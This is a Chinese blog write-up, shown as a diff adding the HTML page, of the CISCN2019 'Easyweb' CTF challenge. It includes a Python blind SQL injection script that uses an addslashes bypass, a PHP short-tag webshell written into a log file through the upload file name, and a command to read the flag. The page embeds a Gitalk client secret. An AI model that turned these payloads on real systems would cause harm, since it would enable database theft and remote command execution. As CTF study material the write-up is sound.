@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：&amp;emsp;自己还是太菜了，前面去刷了下bugku的题目还以为自己已经入门了。没想到再来buu发现原来我离入门还有一定的距离(独立写这种脚本都写不出 {枯了})。前段时间说开学前把buu中的web一分题做完就可以了，没想到1分题也有更新（本来做完了）。此时心情复杂，送自己一句(“加油，相信自己，小菜鸡”)。 敏感文件泄露 拿到题目尝试过登入sql注入，发现返回的图片是没有规律的，那就无法继续">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2019 总决赛 Day2 Web1]Easyweb">
+<meta property="og:url" content="https://mayi077.github.io/2020/02/19/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言：&amp;emsp;自己还是太菜了，前面去刷了下bugku的题目还以为自己已经入门了。没想到再来buu发现原来我离入门还有一定的距离(独立写这种脚本都写不出 {枯了})。前段时间说开学前把buu中的web一分题做完就可以了，没想到1分题也有更新（本来做完了）。此时心情复杂，送自己一句(“加油，相信自己，小菜鸡”)。 敏感文件泄露 拿到题目尝试过登入sql注入，发现返回的图片是没有规律的，那就无法继续">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e4ca79948b86553ee7ea75b.jpg">
+<meta property="article:published_time" content="2020-02-19T03:45:26.000Z">
+<meta property="article:modified_time" content="2020-02-19T03:46:39.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="脚本积累">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e4ca79948b86553ee7ea75b.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/02/19/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>[CISCN2019 总决赛 Day2 Web1]Easyweb | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/19/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [CISCN2019 总决赛 Day2 Web1]Easyweb
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-19 11:45:26 / 修改时间：11:46:39" itemprop="dateCreated datePublished" datetime="2020-02-19T11:45:26+08:00">2020-02-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF复现</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>&emsp;自己还是太菜了，前面去刷了下bugku的题目还以为自己已经入门了。没想到再来buu发现原来我离入门还有一定的距离(独立写这种脚本都写不出 {枯了})。前段时间说开学前把buu中的web一分题做完就可以了，没想到1分题也有更新（本来做完了）。此时心情复杂，送自己一句(“加油，相信自己，小菜鸡”)。</p>
+<h3 id="敏感文件泄露"><a href="#敏感文件泄露" class="headerlink" title="敏感文件泄露"></a>敏感文件泄露</h3><ol>
+<li>拿到题目尝试过登入sql注入，发现返回的图片是没有规律的，那就无法继续sql注入了。查看源码发现了image.php中有<code>id=</code> 尝试注入，也无果。</li>
+<li>使用御剑扫描发现<strong>robots.txt</strong>文件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### robots.txt 文件内容如下</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure></li>
+<li>尝试访问<code>index.php.bak</code> 无果。接着访问<code>image.php.bak</code> 发现image.php的源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line">#addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义的字符有：单引号，双引号，反斜杠，NULL</span><br><span class="line">#我们输入id&#x3D;\\0</span><br><span class="line">$id&#x3D;addslashes($id);</span><br><span class="line">$path&#x3D;addslashes($path);</span><br><span class="line">#变成了id&#x3D;\\\\0</span><br><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">#变成id&#x3D;\\</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br><span class="line">$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);</span><br><span class="line">#到这里的时候 where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;  ,也就是说id&#x3D; ‘ or path&#x3D; 了，$path可以自由定义了！</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line">$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image&#x2F;jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="绕过及sql注入"><a href="#绕过及sql注入" class="headerlink" title="绕过及sql注入"></a>绕过及sql注入</h3><ol>
+<li>经过上面代码的审计我们可以知道传入<code>url/image.php?id=\\0&amp;path= or 1=1 %23</code> 可以绕过。那么我们可以更换 <strong>or</strong> 后面的语句来盲注出、数据库、表、数据。使用代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;04c4f002-4712-444e-bbb6-f690232960d3.node3.buuoj.cn&#x2F;image.php&quot;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(0, 30):</span><br><span class="line">    right &#x3D; 127</span><br><span class="line">    left &#x3D; 32</span><br><span class="line">    mid &#x3D; int((right + left) &gt;&gt; 1)</span><br><span class="line">    while right &gt; left:</span><br><span class="line">        payload &#x3D; &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        params &#x3D; &#123;</span><br><span class="line">            &#39;id&#39;: &#39;\\0&#39;,</span><br><span class="line">            &#39;path&#39;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.get(url, params&#x3D;params)</span><br><span class="line"></span><br><span class="line">        if &quot;JFIF&quot; in response.text:</span><br><span class="line">            left &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right &#x3D; mid</span><br><span class="line">        mid &#x3D; int((right + left) &gt;&gt; 1)</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure></li>
+<li>通过更改上面的部分代码可以依次得到<code>users</code>表<code>password</code>，<code>usernaem</code>列，那么我们可以得到adimn账户和密码。</li>
+</ol>
+<h3 id="文件上传：短标签绕过php过滤"><a href="#文件上传：短标签绕过php过滤" class="headerlink" title="文件上传：短标签绕过php过滤"></a>文件上传：短标签绕过php过滤</h3><ol>
+<li>上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错。</li>
+<li>上传一个正常图片，然后告诉我把文件名记录在日志里。因为是把文件名保存到日志中，而且日志文件是php，所以直接利用文件名写shell，把文件名改成一句话木马。</li>
+<li>PHP开启短标签即<strong>short_open_tag=on</strong>时，可以使用<?=$_?>输出变量。我们抓包将文件名改为<code>&lt;?=$_GET[&#39;cmd&#39;]; ?&gt;</code><br><img data-src="https://pic.downk.cc/item/5e4ca79948b86553ee7ea75b.jpg" alt=""></li>
+<li>接着我们即可访问后门得到flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;logs&#x2F;upload.140e0a9ba1918fb8567d5d971da62bd7.log.php?cmd&#x3D;system(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="php-ini-中的-short-open-tag-的作用"><a href="#php-ini-中的-short-open-tag-的作用" class="headerlink" title="php.ini 中的 short_open_tag 的作用"></a>php.ini 中的 short_open_tag 的作用</h3><p>&emsp;在PHP的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的段标签：(<? ?>)。同时，只有开启这个才可以使用 <?= 以代替 <? echo 。  
+&emsp;但是这个短标签是不推荐的，使用<?php ?>才是规范的方法。只是因为这种短标签使用的时间比较长，这种特性才被保存了下来。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/02/19/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/" title="[CISCN2019 总决赛 Day2 Web1]Easyweb">https://mayi077.github.io/2020/02/19/CISCN2019-总决赛-Day2-Web1-Easyweb/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buuctf/" rel="tag"><i class="fa fa-tag"></i>buuctf</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i>代码审计</a>
+              <a href="/tags/%E8%84%9A%E6%9C%AC%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>脚本积累</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/14/SUCTF-2019-EasyWeb/" rel="prev" title="[SUCTF 2019]EasyWeb">
+      <i class="fa fa-chevron-left"></i> [SUCTF 2019]EasyWeb
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/" rel="next" title="[安洵杯 2019]easy_serialize_php">
+      [安洵杯 2019]easy_serialize_php <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#敏感文件泄露"><span class="nav-number">2.</span> <span class="nav-text">敏感文件泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过及sql注入"><span class="nav-number">3.</span> <span class="nav-text">绕过及sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传：短标签绕过php过滤"><span class="nav-number">4.</span> <span class="nav-text">文件上传：短标签绕过php过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-ini-中的-short-open-tag-的作用"><span class="nav-number">5.</span> <span class="nav-text">php.ini 中的 short_open_tag 的作用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'd578948eea8bc045a2938668fc222812',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
